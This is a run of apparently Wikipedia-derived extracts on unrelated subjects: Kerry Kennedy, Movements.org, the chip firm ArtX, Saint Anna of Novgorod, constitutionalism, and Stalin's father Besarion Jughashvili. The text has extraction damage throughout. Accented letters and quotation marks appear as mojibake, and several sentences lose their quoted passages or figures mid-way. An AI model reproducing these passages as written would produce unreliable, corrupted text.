either. Kennedy admitted to having been in a car wreck 18 months before the incident, as well as suffering a head injury that required medication. Kennedy was acquitted of the charges on February 28, 2014. \\"You have to wonder why this ill-advised prosecution was brought,\\" Lefcourt said after the verdict. \\"Was it because of who the defendant is? They concede it was accidental and nevertheless pursued this case. I find this very depressing.\\" Prosecutors defended their actions. \\"This case was treated no differently from any of the others,\\" Lucian Chalfen, spokesman for the Westchester County District Attorney said. On March 3, 2014, Kennedy appeared on NBC's Today and criticized Westchester County for prosecuting \\"people who the district attorney and police believe to be innocent of the crime, simply because of county protocol requiring all cases to be pursued.\\" References External links * Kerry Kennedy talks with NPR's Tavis Smiley about her father's legacy on the 35th anniversary of his death * Requests for her designation as a non-grata persona * 1959 births American people of Dutch descent American people of Irish descent American Roman Catholics Boston College Law School alumni Brown University alumni Cuomo family Living people People from Washington, D.C.

It is an online marketplace that connects dissidents in closed societies to individuals in open societies with experience in such areas as legal work, mathematics, science, media, PR and technology. When activists post requests for assistance, experts and professionals respond with offers of assistance.  History  In October 2008, Columbia University, the US Department of State, Google, Howcast Media and other media companies sponsored the inaugural Alliance of Youth Movements Summit. This event brought together digital activists, technology and media leaders, non-governmental organisations (NGOs), and governments to convene, share best practices, and create a network of socially responsible Grassroots activists using technology for their movements and campaigns. Following the inaugural summit, Jason Liebman (CEO and co-founder of Howcast), Roman Tsunder (co-founder of Access 360 Media), and Jared Cohen (Director of Google Ideas at Google) co-founded the Alliance for Youth Movements. This organization was dedicated to identifying, connecting, and supporting digital activists at the annual summit and throughout the year. In December 2009, The Alliance for Youth Movements hosted its 2nd annual summit in Mexico City. This summit was sponsored by the US Department of State as well as other sponsors. The event convened activists and supporters interested in how social media and connection technologies were helping to combat violence, with a special focus on Latin America. In March 2010, The Alliance for Youth Movements hosted its 3rd annual summit in London, which was sponsored by the UK Home Office and other media companies. At the end of the summit, it was announced that the Alliance for Youth Movements was launching a new online hub for digital activism, Movements.org. In February 2011, Movements.org officially launched and the Alliance for Youth Movements re-branded itself as Movements.org. In June 2012, Movements.org formally became a division of Advancing Human Rights (AHR), created in 2010 by Robert L. Bernstein (the founder of Human Rights Watch and former President and CEO of Random House for twenty-five years). AHR focuses on freedom of speech, women‚Äôs rights and promoting the freedoms outlined in the Universal Declaration of Human Rights, particularly by leveraging the power of the Internet. In 2016 Movements.org separated from Advancing Human Rights and is an independent project managed with the help of Democracy Council. In August 2012, Movements.org in collaboration with Al Jazeera launched an interactive tool that tracks the defections of senior Syrian military officials, members of parliament and diplomats of Assad's regime. The tracker was released on Al Jazeera. On July 9, 2014, Movements.org launched as a marketplace site, where dissidents in closed societies could connect to legal, PR and technology experts in open societies.[7][1] Natan Sharansky said of the platform, ‚ÄúToo often, leaders of the Free World have proved to be a disappointment to today's dissidents.

Activists can post short descriptions of their projects and needs, while legal and other experts provide assistance using their special skills. Movements received support from Google Ideas in its start-up phase, and from Ronin Analytics in the design of its digital security perimeter. Since its launch in July 2014, Movements.org has announced partnerships with SaferVPN - a software provider, which has committed to make free VPN subscriptions available for activists in closed societies, and Youth Service America who run events to empower young people to engage in volunteer work.

The company was focused on delivering a PC graphics chip that was both high performance and cost effective, and hoped to be able to instantly compete with then-dominant 3dfx and other fledgling competitors such as nVidia. ArtX was led by Dr. Wei Yen, who had been SGI's head of Nintendo Operations, the department responsible for the Nintendo 64's fundamental design. David Orton, who was head of the advanced graphics division of Silicon Graphics, was appointed President of ArtX. History In late 1997, SGI filed a non-compete lawsuit against ArtX, claiming that the startup's staff of high level SGI alumni would be utilizing SGI's trade secrets. This lawsuit was quietly dropped in 1998. ArtX was contracted in May 1998 to create the system logic and the graphics processor (code named Flipper) for Nintendo's fourth game console (code named \\"Dolphin\\"), which would eventually be launched as the GameCube.

She was the daughter of Swedish King Olof Sk√∂tkonung and Estrid of the Obotrites and the consort of Yaroslav I the Wise of Kiev. Ingegerd or Saint Anna is often confused with the mother of Saint Vladimir ‚Äúthe Enlightener‚Äù of the Rus. This is mainly because Ingegerd and Yaroslav also had a son named Vladimir. However, Saint Vladimir was the father of Ingegerd‚Äôs husband Yaroslav I ‚Äúthe Wise‚Äù, thus making her Saint Vladimir‚Äôs daughter-in-law. Saint Vladimir was the son of Sviatoslav and Malusha. Life Saint Sophia Cathedral in Kiev Saint Sophia Cathedral in Novgorod Ingegerd was born a princess in the court of King Olof Sk√∂tkonung. In 1015, after Olaf II of Norway assumed the throne as King of Norway, he proposed a royal marriage alliance. In 1016, noblemen of both countries tried to arrange a marriage between King Olaf and Princess Ingegerd. Olof Sk√∂tkonung agreed at first but later he reneged. Rather he agreed to the marriage of his daughter, Astrid Olavsdatter to King Olaf. Olof Sk√∂tkonung subsequently arranged for the marriage of Princess Ingegerd to the powerful Grand Prince Yaroslav I the Wise of Novgorod with whom Sweden had a flourishing trade relationship. The marriage took place in 1019. Once in Kiev, Ingegerd had her name changed to the Greek Irene. According to several sagas, she received as a marriage gift Ladoga and adjacent lands, which later became known as Ingria, arguably a corruption of Ingegerd's name. She arranged for her father's cousin, jarl Ragnvald Ulfsson, to rule in her stead. Together Ingegerd and Yaroslav had six sons and four daughters; three of the latter becoming Queens of France, Hungary, and Norway. The whole family is depicted in one of the frescoes of the Saint Sophia. =Death and burial= Ingegerd died on 10 February 1050. Upon her death, according to different sources, Ingegerd was buried in either Saint Sophia's Cathedral in Kiev or Cathedral of St. Sophia in Novgorod. Sainthood Ingegerd initiated the building of the Saint Sophia's Cathedral in Kiev (foundation laid in 1037). She also initiated the construction of Cathedral of St. Sophia in Novgorod (built between 1045 and 1050). Ingegerd was later declared a saint under the name of St. Anna in Novgorod and Kiev. The reason for her sainthood was that she initiated the building of both cathedrals in Kiev and in Novgorod together with many other good deeds. The following was stated by the church in reference to her sainthood: > St. Anna, Grand Duchess of Novgorod, She was the daughter of Swedish King > Olaf Sketktung, the \\"All-Christian King,\\" who did much to spread Orthodoxy > in Scandinavia, and the pious Queen Astrida. In Sweden she was known as > Princess Indegard; she married Yaroslav I ‚Äúthe Wise‚Äú, Grand Prince of Kiev, > who was the founder of the Saint Sophia Cathedral in 1016, taking the name > Irene. She gave shelter to the outcast sons of British King Edmund, Edwin > and Edward, as well as the Norwegian prince Magnus, who later returned to > Norway. She is perhaps best known as the mother of Vsevolod of , himself the > father of Vladimir Monomakh and progenitor of the Princes of Moscow. Her > daughters were Anna, Queen of France, Queen Anastasia of Hungary, and Queen > Elizabeth (Elisiv) of Norway. The whole family was profoundly devout and > pious. She reposed in 1050 in the Cathedral of Holy Wisdom (St. Sophia) in > Kiev, having been tonsured a monastic with the name of Anna. As saint, her hymn goes: And 4 stichera, in Tone I: Spec. Mel.: Joy of the ranks of heaven > O joy of the Swedish people, thou didst gladden the Russian realm, filling > it with grace and purity, adorning its throne with majesty, lustrous in > piety like a priceless gem set in a splendid royal crown. Named Ingegerd in > the baptismal waters, O venerable one, thou wast called Irene by thy Russian > subjects, who perceived in thee the divine and ineffable peace; but when > thou didst submit to monastic obedience, thou didst take the new name, Anna, > after the honoured ancestor of Christ, the King of kings. Wed in honourable > matrimony, O holy Anna, thou didst live in concord with thy royal spouse, > the right-believing and most wise Prince Yaroslav; and having born him holy > offspring, after his repose thou didst betroth thyself unto the Lord as thy > heavenly Bridegroom.

Fehrenbacher, Constitutions and Constitutionalism in the Slaveholding South (University of Georgia Press, 1989). p. 1. . Political organizations are constitutional to the extent that they \\"contain institutionalized mechanisms of power control for the protection of the interests and liberties of the citizenry, including those that may be in the minority\\". As described by political scientist and constitutional scholar David Fellman:  Definition  Constitutionalism has prescriptive and descriptive uses. Law professor Gerhard Casper captured this aspect of the term in noting, \\"Constitutionalism has both descriptive and prescriptive connotations. Used descriptively, it refers chiefly to the historical struggle for constitutional recognition of the people's right to 'consent' and certain other rights, freedoms, and privileges. Used prescriptively, its meaning incorporates those features of government seen as the essential elements of the... Constitution\\".Leonard Levy, ed., Encyclopedia of the American Constitution, (Gerhard Casper, \\"Constitutionalism\\"), vol 2, p. 473 (1986) . =Descriptive= One example of constitutionalism's descriptive use is law professor Bernard Schwartz's five volume compilation of sources seeking to trace the origins of the U.S. Bill of Rights.Bernard Schwartz, The Roots of the Bill of Rights (5 vols., Chelsea House Publisher, 1980) . Beginning with English antecedents going back to Magna Carta (1215), Schwartz explores the presence and development of ideas of individual freedoms and privileges through colonial charters and legal understandings. Then in carrying the story forward, he identifies revolutionary declarations and constitutions, documents and judicial decisions of the Confederation period and the formation of the federal Constitution. Finally, he turns to the debates over the federal Constitution's ratification that ultimately provided mounting pressure for a federal bill of rights. While hardly presenting a straight line, the account illustrates the historical struggle to recognize and enshrine constitutional rights and principles in a constitutional order. =Prescriptive= In contrast to describing what constitutions are, a prescriptive approach addresses what a constitution should be. As presented by the Canadian philosopher Wil Waluchow, constitutionalism embodies One example of this prescriptive approach was the project of the National Municipal LeagueFrank Mann Stewart, A Half Century of Municipal Reform: A History of the National Municipal League Ch.2 (Univ. of California Press, 1950). to develop a model state constitution. = Constitutionalism vs. Constitution = The study of constitutions is not necessarily synonymous with the study of constitutionalism. Although frequently conflated, there are crucial differences. A discussion of this difference appears in legal historian Christian G. Fritz's American Sovereigns: The People and America's Constitutional Tradition Before the Civil War,(Cambridge University Press, 2008). a study of the early history of American constitutionalism. Fritz notes that an analyst could approach the study of historic events focusing on issues that entailed \\"constitutional questions\\" and that this differs from a focus that involves \\"questions of constitutionalism.\\"Christian G. Fritz, American Sovereigns: The People and America's Constitutional Tradition Before the Civil War (Cambridge University Press, 2008). p. 6 . Constitutional questions involve the analyst in examining how the constitution was interpreted and applied to distribute power and authority as the new nation struggled with problems of war and peace, taxation and representation. However, A similar distinction was drawn by British constitutional scholar A.V. Dicey in assessing Britain's unwritten constitution. Dicey noted a difference between the \\"conventions of the constitution\\" and the \\"law of the constitution\\". The \\"essential distinction\\" between the two concepts was that the law of the constitution was made up of \\"rules enforced or recognised by the Courts\\", making up \\"a body of 'laws' in the proper sense of that term.\\" In contrast, the conventions of the constitution consisted \\"of customs, practices, maxims, or precepts which are not enforced or recognised by the Courts\\" but \\"make up a body not of laws, but of constitutional or political ethics\\".Dicey, A. V., Introduction to the Study of the Law of the Constitution , 8th ed. (London: Macmillan 1914) (Part III: The Connection between the law of the constitution and the conventions of the constitution; Ch 14.  Core features  Magna Carta of England (the \\"Great Charter\\") created in 1215 is regarded as one of the greatest constitutional documents of all times. = Fundamental law and legitimacy of government = One of the most salient features of constitutionalism is that it describes and prescribes both the source and the limits of government power derived from fundamental law. William H. Hamilton has captured this dual aspect by noting that constitutionalism \\"is the name given to the trust which men repose in the power of words engrossed on parchment to keep a government in order.\\"Walton H. Hamilton, \\"Constitutionalism\\". in Edwin R.A. Seligman, et al. (eds) Encyclopedia of the Social Sciences (New York: Macmillan 1931). p. 255. Moreover, whether reflecting a descriptive or prescriptive focus, treatments of the concept of constitutionalism all deal with the legitimacy of government. One recent assessment of American constitutionalism, for example, notes that the idea of constitutionalism serves to define what it is that \\"grants and guides the legitimate exercise of government authority\\".Christian G. Fritz, American Sovereigns: The People and America's Constitutional Tradition Before the Civil War (Cambridge University Press, 2008). p. 1. . Similarly, historian Gordon S. Wood described this American constitutionalism as \\"advanced thinking\\" on the nature of constitutions in which the constitution was conceived to be a \\"sett of fundamental rules by which even the supreme power of the state shall be governed.\\"Gordon S. Wood, The Creation of the American Republic, 1770‚Äì1787 (Norton & Co. 1969). p. 268. (quoting Demophilus, Genuine Principles . p. 4> (Demophilus [George Bryan?]: the Genuine Principles of the Ancient Saxon, Or English [,] Constitution). Ultimately, American constitutionalism came to rest on the collective sovereignty of the people, the source that legitimized American governments. = Civil rights and liberties = Constitutionalism is not simply about the power structure of society. It also asks for a strong protection of the interests of citizens, civil rights as well as civil liberties, especially for the social minorities, and has a close relation with democracy.  Criticisms  Legal scholar Jeremy Waldron contends that constitutionalism is often undemocratic: Constitutionalism has also been the subject of criticism by Murray Rothbard, who attacked constitutionalism as incapable of restraining governments and does not protect the rights of citizens from their governments: > [i]t is true that, in the United States, at least, we have a constitution > that imposes strict limits on some powers of government. But, as we have > discovered in the past century, no constitution can interpret or enforce > itself; it must be interpreted by men. And if the ultimate power to > interpret a constitution is given to the government's own Supreme Court, > then the inevitable tendency is for the Court to continue to place its > imprimatur on ever-broader powers for its own government. Furthermore, the > highly touted \\"checks and balances\\" and \\"separation of powers\\" in the > American government are flimsy indeed, since in the final analysis all of > these divisions are part of the same government and are governed by the same > set of rulers.Murray N. Rothbard, For a New Liberty: The Libertarian > Manifesto (1978), p. 48.  Constitutionalism by nations  Used descriptively, the concept of constitutionalism can refer chiefly to the historical struggle for constitutional recognition of the people's right to \\"consent\\" and certain other rights, freedoms, and privileges. On the other hand, the prescriptive approach to constitutionalism addresses what a constitution should be. Two observations might be offered about its prescriptive use. * There is often confusion in equating the presence of a written constitution with the conclusion that a state or polity is one based upon constitutionalism. As noted by David Fellman, constitutionalism \\"should not be taken to mean that if a state has a constitution, it is necessarily committed to the idea of constitutionalism. In a very real sense... every state may be said to have a constitution, since every state has institutions which are at the very least expected to be permanent, and every state has established ways of doing things\\". But even with a \\"formal written document labelled 'constitution' which includes the provisions customarily found in such a document, it does not follow that it is committed to constitutionalism....\\"Philip P. Wiener, ed., \\"Dictionary of the History of Ideas: Studies of Selected Pivotal Ideas\\", (David Fellman, \\"Constitutionalism\\") , vol 1, p. 485 (1973‚Äì74). * Often the word \\"constitutionalism\\" is used in a rhetorical sense, as a political argument that equates the views of the speaker or writer with a preferred view of the constitution. For instance, University of Maryland Constitutional History Professor Herman Belz's critical assessment of expansive constitutional construction notes that \\"constitutionalism... ought to be recognized as a distinctive ideology and approach to political life.... Constitutionalism not only establishes the institutional and intellectual framework, but it also supplies much of the rhetorical currency with which political transactions are carried on.\\"Herman Belz, \\"A Living Constitution or Fundamental Law? American Constitutionalism in Historical Perspective\\" (Rowman & Littlefield Publishers, Inc. 1998) at pp. 148‚Äì49 (Belz further argues: \\"Constitutionalism shapes political life in a variety of ways. Constitutional principles can become matters of commitment and belief possessing intrinsic value that motivate political action.... When citizens and governing officials internalize constitutional values, acting out of fidelity to law rather than expediency, constitutionalism gives direction to political life. Constitutionalism has a configurative effect also in providing the forms, rhetoric, and symbols by which politics is carried on. Political groups and individuals ordinarily try to choose courses of action that are consistent with or required by the Constitution. They do so not because they are in each instance committed to the constitutional principle or value at issue... [but] because they know that the public takes the Constitution seriously, believing that it embodies fundamental values and formal procedures that are the touchstone of political legitimacy. In American politics the Constitution is a justifying concept, and groups that invoke constitutional arguments do so, from their own perspective perhaps and in an immediate sense, instrumentally. Considered from an external and long-range view in relation to the polity as a whole, however, reliance on constitutional principles and rules is normative and noninstrumental. In this way constitutionalism shapes political events\\") . Similarly, Georgetown University Law Center Professor Louis Michael Seidman noted as well the confluence of political rhetoric with arguments supposedly rooted in constitutionalism. In assessing the \\"meaning that critical scholars attributed to constitutional law in the late twentieth century,\\" Professor Seidman notes a \\"new order... characterized most prominently by extremely aggressive use of legal argument and rhetoric\\" and as a result \\"powerful legal actors are willing to advance arguments previously thought out-of-bounds. They have, in short, used legal reasoning to do exactly what crits claim legal reasoning always does‚Äîput the lipstick of disinterested constitutionalism on the pig of raw politics.\\"Louis Michael Seidman, \\"Critical Constitutionalism Now\\" , 75 Fordham Law Review pp. 575, 586 (Nov. 2006). =United States=  Descriptive  Constitutionalism of the United States has been defined as a complex of ideas, attitudes and patterns elaborating the principle that the authority of government derives from the people, and is limited by a body of fundamental law. These ideas, attitudes and patterns, according to one analyst, derive from \\"a dynamic political and historical process rather than from a static body of thought laid down in the eighteenth century\\".Stephen M. Griffin, \\"American Constitutionalism: From Theory to Politics\\" (Princeton University Press, 1996). p. 5. . In U.S. history, constitutionalism, in both its descriptive and prescriptive sense, has traditionally focused on the federal constitution. Indeed, a routine assumption of many scholars has been that understanding \\"American constitutionalism\\" necessarily entails the thought that went into the drafting of the federal constitution and the American experience with that constitution since its ratification in 1789.For the assumptions by historians, political scientists and lawyers that have contributed to a view of constitutionalism essentially connected and confined to the US Constitution, see Christian G. Fritz, \\"Fallacies of American Constitutionalism ,\\" 35 Rutgers Law Journal (2004), 1327‚Äì69. See also Christian G. Fritz, American Sovereigns: The People and America's Constitutional Tradition Before the Civil War (Cambridge University Press, 2008). p. 284 (\\"Invariably, the state constitutional tradition is deemed less authentic because of its departure from the federal model. This has led to the assumption that one need only study the federal Constitution to discover what American constitutionalism was then and is today.\\") . There is a rich tradition of state constitutionalism that offers broader insight into constitutionalism in the United States.G. Alan Tarr, Understanding State Constitutions (Princeton Univ. Press, 1998) and John J. Dinan, The American State Constitutional Tradition (Univ. Press of Kansas, 2006). While state constitutions and the federal constitution operate differently as a function of federalism from the coexistence and interplay of governments at both a national and state level, they all rest on a shared assumption that their legitimacy comes from the sovereign authority of the people or popular sovereignty. This underlying premise, embraced by the American revolutionaries with the Declaration of Independence unites American constitutional tradition.Paul K. Conkin, Self-Evident Truths: Being a Discourse on the Origins & Development of the First Principles of American Government ‚Äì Popular Sovereignty, Natural Rights, and Balance & Separation of Powers (Indiana Univ. Press, 1974), p. 52 (describing \\"the almost unanimous acceptance of popular sovereignty at the level of abstract principle\\"); Edmund S. Morgan, \\"The Problem of Popular Sovereignty,\\" in Aspects of American Liberty: Philosophical, Historical and Political (The American Philosophical Society, 1977), p. 101 (concluding the American Revolution \\"confirmed and completed the subordination of government to the will of the people\\"); Willi Paul Adams, The First American Constitutions: Republican Ideology and the Making of the State Constitutions in the Revolutionary Era (University of North Carolina Press, 1980), p. 137 (asserting that statements of the \\"principle\\" of the people's sovereignty \\"expressed the very heart of the consensus among the victors of 1776\\"). Both experience with state constitutions before and after the federal constitution as well as the emergence and operation of the latter reflect an ongoing struggle over the idea that all governments in America rested on the sovereignty of the people for their legitimacy.Christian G. Fritz, American Sovereigns: The People and America's Constitutional Tradition Before the Civil War (Cambridge University Press, 2008). p. 284 (Observing that from the Revolutionary era to the period before the Civil War \\"Americans continued to wrestle with what it meant that their national as well as state governments rested on the sovereignty of the people\\") .  Prescriptive  Supreme Court of the United States Starting with the proposition that \\"'Constitutionalism' refers to the position or practice that government be limited by a constitution, usually written,\\" analysts take a variety of positions on what the constitution means. For instance, they describe the document as a document that may specify its relation to statutes, treaties, executive and judicial actions, and the constitutions or laws of regional jurisdictions. This prescriptive use of Constitutionalism is also concerned with the principles of constitutional design, which includes the principle that the field of public action be partitioned between delegated powers to the government and the rights of individuals, each of which is a restriction of the other, and that no powers be delegated that are beyond the competence of government.James Madison, in his remarks introducing the Bill of Rights, 8 June 1789, Annals 1:424‚Äì50. Link Two notable Chief Justices of the United States who played an important role in the development of American constitutionalism are John Marshall and Earl Warren. John Marshall, the 4th Chief Justice, upheld the principle of judicial review in the 1803 landmark case Marbury v. Madison, whereby Supreme Court could strike down federal and state laws if they conflicted with the Constitution. By establishing the principle of judicial review, Marshall Court helped implement the ideology of separation of powers and cement the position of the American judiciary as an independent and co-equal branch of government. On the other hand, Earl Warren, the 14th Chief Justice, greatly extended civil rights and civil liberties of all Americans through a series of landmark rulings. The Warren Court started a liberal Constitutional Revolution by bringing \\"one man, one vote\\" to the United States, tearing apart racial segregation and state laws banning interracial marriage, extending the coverage of Bill of Rights, providing defendants' rights to an attorney and to silence (Miranda warning), and so on. =United Kingdom=  Descriptive  Parliament of the United Kingdom The United Kingdom is perhaps the best instance of constitutionalism in a country that has an uncodified constitution. A variety of developments in 17th century England, including the Constitutional Monarchy and \\"the protracted struggle for power between King and Parliament was accompanied by an efflorescence of political ideas in which the concept of countervailing powers was clearly defined,\\" led to a well-developed polity with multiple governmental and private institutions that counter the power of the state. (Bagehot noted his intent to correct mistaken views of the British constitution, including whether the constitution was \\"laid down as a principle of the English polity, that in it the legislative, the executive, and the judicial powers, are quite divided....\\")  Prescriptive  Constitutionalist was also a label used by some independent candidates in UK general elections in the early 1920s. Most of the candidates were former Liberal Party members, and many of them joined the Conservative Party soon after being elected. The best known Constitutionalist candidate was Winston Churchill in the 1924 UK general election.British parliamentary election results 1918‚Äì1949, Craig, F.W.S. =Japan= On May 3, 1947, the sovereign state of Japan has maintained a unitary parliamentary constitutional monarchy with an Emperor and an elected legislature called the National Diet. =Polish‚ÄìLithuanian Commonwealth=  Descriptive  From the mid- sixteenth to the late eighteenth century, the Polish‚ÄìLithuanian Commonwealth utilized the liberum veto, a form of unanimity voting rule, in its parliamentary deliberations. The \\"principle of liberum veto played an important role in [the] emergence of the unique Polish form of constitutionalism.\\" This constraint on the powers of the monarch were significant in making the \\"[r]ule of law, religious tolerance and limited constitutional government... the norm in Poland in times when the rest of Europe was being devastated by religious hatred and despotism.\\" Prescriptive The Constitution of May 3, 1791, which historian Norman Davies calls \\"the first constitution of its kind in Europe\\", was in effect for only a year. It was designed to redress longstanding political defects of the Polish‚ÄìLithuanian Commonwealth and its traditional system of \\"Golden Liberty\\". The Constitution introduced political equality between townspeople and nobility (szlachta) and placed the peasants under the protection of the government, thus mitigating the worst abuses of serfdom. =Dominican Republic= After the democratically elected government of president Juan Bosch in the Dominican Republic was deposed, the Constitutionalist movement was born in the country. As opposed to said movement, the Anti- constitutionalist movement was also born. Bosch had to depart to Puerto Rico after he was deposed. His first leader was Colonel Rafael Tom√°s Fern√°ndez Dom√≠nguez, and he wanted Bosch to come back to power once again. Colonel Fern√°ndez Dom√≠nguez was exiled to Puerto Rico where Bosch was. The Constitutionalists had a new leader: Colonel Francisco Alberto Caama√±o De√±√≥. = Islamic states = The scope and limits of constitutionalism in Muslim countries have attracted growing interest in recent years. Authors such as Ann E. Mayer define Islamic constitutionalism as \\"constitutionalism that is in some form based on Islamic principles, as opposed to constitutionalism that has developed in countries that happen to be Muslim but that has not been informed by distinctively Islamic principles\\".Ann E. Mayer, Conundrums in Constitutionalism: Islamic Monarchies in an Era of Transition, 1 UCLA J. Islamic & Near E.L. 183 (Spring / Summer, 2002). However, the concrete meaning of the notion remains contested among Muslim as well as Western scholars. Influential thinkers like Mohammad Hashim KamaliMohammad Hashim Kamali, Constitutionalism in Islamic Countries: A Contemporary Perspective of Islamic Law, in: Rainer Grote and Tilmann R√∂der (eds.), Constitutionalism in Islamic Countries: Between Upheaval and Continuity, Oxford University Press, Oxford/New York 2011. and Khaled Abou El Fadl,Khaled Abou El Fadl, Shariah and Constitutionalism in: Rainer Grote and Tilmann R√∂der (eds.), Constitutionalism in Islamic Countries: Between Upheaval and Continuity, Oxford University Press, Oxford/New York 2011. but also younger ones like Asifa QuraishiAsifa Quraishi, The Separation of Powers in the Tradition of Muslim Governments, in: Rainer Grote and Tilmann R√∂der (eds.), Constitutionalism in Islamic Countries: Between Upheaval and Continuity, Oxford University Press, Oxford/New York 2011. and Nadirsyah HosenNadirsyah Hosen, \\"In search of Islamic Constitutionalism\\", American Journal of Islamic Social Sciences, Volume 21, No. 2, 2004, 23 foll. combine classic Islamic law with modern constitutionalism.

Born into a peasant family of serfs in Didi Lilo in Georgia, he moved to Tbilisi at a young age to be a shoemaker, working in a factory. He was invited to set up his own shop in Gori, where he met and married Ekaterine Geladze, with whom had three sons; only the youngest, Ioseb, lived. Once known as a \\"clever and proud\\" man, Jughashvili's shop failed and he developed a serious drinking problem, wherefore he left his family and moved back to Tbilisi in 1884, working in a factory again. He had little contact with either his wife or son after that point, and little is known of his life from then on, except that he died in 1909 of cirrhosis. Family background and early life Little is known of the family of Besarion Jughashvili. His grandfather, Zaza Jughashvili (1798‚Äì1847), was involved in the 1804 Mtiuleti rebellion against the Russian Empire, which had only annexed eastern Georgia (Kartli-Kakheti) in 1801. Zaza was possibly of Ossetian background, with historian Simon Sebag Montefiore suggesting he came from the village of Geri, near modern South Ossetia, though this claim can not be proven.Stephen Kotkin writes that Zaza \\"may have lived in a trial Ossetian village,\\" but did not specify a name (). Even so, it would not have a major impact: Robert Service explains that \\"the peoples of the Caucasus had moved around the region for centuries,\\" while also notes that the claim was made to explain Stalin's later actions, \\"since the mountain peoples are widely regarded as less civilized than town dwellers of the valleys\\" (). Furthermore, Donald Rayfield has stated that \\"Stalin's possibly Osetic blood is no more significant to Georgian or Russian history than Henry Tudor's Welshness is to English history,\\" which is to say, not at all (). Zaza escaped the uprising and moved to Didi Lilo, a village about away from the capital, Tiflis (now Tbilisi). He worked as a serf for Prince Badur Machabeli, tending to his vineyards. There he had a son, Vano (the Georgian diminutive for Ivane), who in turn had two sons: Giorgi, and Besarion, who was likely born around 1850. Vano died young, likely before he turned 50, while Giorgi worked as an innkeeper until he was killed by bandits. With no family left Jughashvili moved to Tiflis and worked in the G.G. Adelkhanov shoe factory. Already literate, it is likely in Tiflis that he learned Armenian, Azerbaijani, and Russian, in addition to his native Georgian. Around 1870 he was invited to move to Gori, about from Tiflis, and make shoes for the Russian soldiers garrisoned there. Gori was a small town at the time, with roughly 7000 residents; the majority were Armenian, with a large number of Georgians, as well as small numbers of Russians, Abkhaz, and Ossetians. It grew in importance in 1871 when a branch of the Transcaucasus Railway connected the town to Tiflis and Poti, a major port for oil export. Life in Gori Ioseb Jughashvili, Jughashvili's third son, and the only one who survived childhood, pictured in 1894. He would grow up and take the name Joseph Stalin.

In 1872 or 1874 he married Ekaterine (Keke) Geladze, a peasant girl who was probably 16.Montefiore and Rayfield state the wedding took place in 1872 (see and ), while Kotkin states it was in 1874. Kotin also points out that Montefiore's timeline doesn't work, as Montefiore states that \\"just over nine months after the wedding, on 14 February 1875\\" ( Keke, \\"an attractive freckled girl with auburn hair,\\" was from the village of Gambareuli near Gori, and had moved to the town at a young age after her father died. They had three children, all boys, though the first two, Mikheil (born 14 February 1875) and Giorgi (born 24 December 1876), died aged two months and six months, respectively. Their third and final son, Ioseb, was born on 6 December 1878. Ioseb would later change his name to Joseph Stalin. Montefiore writes that after the death of Mikheil, Jughashvili started to drink heavily, and that the marriage began to deteriorate. Kotkin has also suggested that rumours of infidelity by Keke took a toll on him, especially after the birth of Ioseb, with several men suggested as his possible father. However, Kotkin concedes that \\"whether Keke was flirtatious, let alone promiscuous, is unclear,\\" and that \\"reliable evidence about the possible liaisons of the future Stalin's mother is lacking,\\" and argues that Jughashvili was probably the father. Jughashvili's shop was initially quite successful, employing up to ten people as well as apprentices, and the family initially enjoyed a rather high standard of living; a former apprentice would later note that he frequently saw butter in their home, which was an expensive delicacy for most Georgians (however Kotkin writes that the family lived more modestly, eating more traditional foods like lobio, lavash, and badrijani nigvzit). However Jughashvili's drinking, exacerbated by a Georgian custom that business paid in part with wine rather than money, had adverse effects on his business and home life. Isaac Deutscher felt that Jughashvili's inability to lift his status, \\"to be his own master,\\" likely contributed to his drinking and frustrations. This idea is echoed by Robert Service, who noted that Jughashvili did not adapt to make European-style shoes that were popular at the time, and instead kept producing traditional Georgian styles, and suggests that the rumours about Keke were also a major influence on his drinking. Frequently drunk, Jughashvili became violent and routinely would beat Keke (who often hit back) and Iosef, frequently fought in public, earning the nickname \\"Crazy Beso.\\" Later life and death Telavi, Georgia. Originally buried in a common grave, what was thought to be his grave was identified in 1972. In 1884 Jughashvili left the family and moved to Tiflis.Montefiore () states that Jughashvili left after Ioseb contracted smallpox, though Kotin () suggests the events were unrelated, and implies Jughashvili left before the smallpox outbreak, and that he was told to leave by the Gori police chief after attacking him. He returned to his old job at the Adelkhanov factory. He sent some money to Keke, as well as offers to reconcile, but all efforts to do so failed. Jughashvili was upset when he learned that Keke had enrolled Ioseb in school, instead hoping his son would follow his path and become a cobbler. This led to a major incident in January 1890. Ioseb had been struck by a phaeton, severely injuring him. Jughashvili returned to Gori and brought his son to a Tiflis hospital, and after Ioseb healed he was apprenticed to the Adelkhanov factory. Keke was adamantly opposed to the idea and used her connections with the church to bring Ioseb back to Gori, where he would continue his studies to become a priest. This marked the last real contact Jughasvhili had with his wife or son, as he cut off contact and financial support when Ioseb left Tiflis. Soon after Ioseb left Tiflis, Jughashvili seems to have left the Adelkhanov factory. He briefly made shoes in a stall at the Armenian bazaar in Tiflis, and his actions after that are uncertain. He did keep in contact with Ioseb, occasionally sending him hand-made shoes. Jughashvili also had one final role in Ioseb's life: in January 1900 Ioseb was arrested for the first time, on account of Jughashvili. When Jughashvili left Didi Lilo he was not removed from the village roles, and still owed taxes as a peasant from the region. It is not clear why Ioseb was arrested instead of his father, who still lived in Tiflis, but Kotkin suggests it was a police tactic to send a message to Ioseb, who had begun his revolutionary activities. In August 1909 Jughashvili went to the Mikhailovsky Hospital in Tiflis, suffering from tuberculosis, colitis and chronic pneumonia. He died on 12 August 1909, with the cause of death listed as cirrhosis of the liver. Only one person, a fellow cobbler, attended his funeral, and he was buried in an unmarked grave in Telavi. The location of his grave was unknown until 1972, when Kandid Charkviani, the former First Secretary of the Georgian Communist Party, led efforts to find it and mark it, though it was not confirmed if Jughashvili's remains were still there. Charkviani had previously looked for photos of Jughashvili, at one point bringing several to Stalin to confirm their authenticity; after looking at them Stalin was unable to confirm if any were his father. There is only one photo purportedly of Jughasvhili, though its authenticity has never been confirmed. In an interview with historian Lilly Marcou (fr) in 1995, Stalin's granddaughter, Nadezhda Alliluyeva claimed that Stalin could not be Jughashvili's son and that the photo of him was rigged since he would never have been photographed.

